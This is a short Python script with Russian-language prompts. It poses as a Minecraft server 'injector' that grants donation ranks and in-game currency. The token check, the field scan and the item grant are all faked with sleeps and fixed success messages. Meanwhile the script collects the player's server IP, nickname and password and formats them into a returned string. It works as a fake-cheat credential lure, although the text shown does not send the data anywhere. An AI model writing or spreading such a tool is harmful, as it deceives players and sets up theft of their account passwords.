import colorama
import time

def main():
    run = True
    enter = colorama.Fore.YELLOW + '_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_'
    print(enter)
    print(colorama.Fore.RED + 
        '''
        
            __         __              __                            
            |__|.-----.|__|.-----.----.|  |_  .--.--.-----.--.--.----.
            |  ||     ||  ||  -__|  __||   _| |  |  |  _  |  |  |   _|
            |__||__|__||  ||_____|____||____| |___  |_____|_____|__|  
                        |___|                   |_____|                 
                            __                            
                        .--|  |.----.-----.---.-.--------.
                        |  _  ||   _|  -__|  _  |        |
                        |_____||__| |_____|___._|__|__|__|
        '''
            )
    print(enter)
    while run:
        a = input(colorama.Fore.BLUE + 'Введите ваш токен: ')
        print('Проверяем ваш токен...')
        time.sleep(4)
        print(colorama.Fore.GREEN + 'Ваш токен рабочий!')
        print(enter)
        
        ip = input(colorama.Fore.BLUE + 'Айпи сервера: ')
        name = input(colorama.Fore.BLUE + 'Никнейм в майнкрафте: ')
        passw = input(colorama.Fore.BLUE + 'Пароль на сервере: ')
        print('Смотрим какие поля можна подменить...')
        time.sleep(3)
        print(colorama.Fore.GREEN + 'Доступные поля')
        time.sleep(2)

        print(colorama.Fore.GREEN + 
            'Донат - d + цифра(d 1) RANGER: 1, KNIGHT: 2, ELDER: 3, KING: 4, BERSERK: 5, PHOENIX: 6\n',
            'Валюта рубли - r + количество(r 500 000) (за один раз примерно сутки до 2м)\n',
            )
        print(enter)
        g = input(colorama.Fore.BLUE + 'Введите что хотите получить: ')
        time.sleep(6)
        print(colorama.Fore.GREEN + 'Зайдите на сервер и если все прошло хорошо и вы все правильно ввели предметы будут выданы.')
        print(enter)
        time.sleep(10)
        run = False
        break
    
    result = f'Ip: {ip}, Name: {name}, Password: {passw}'
    return result

main()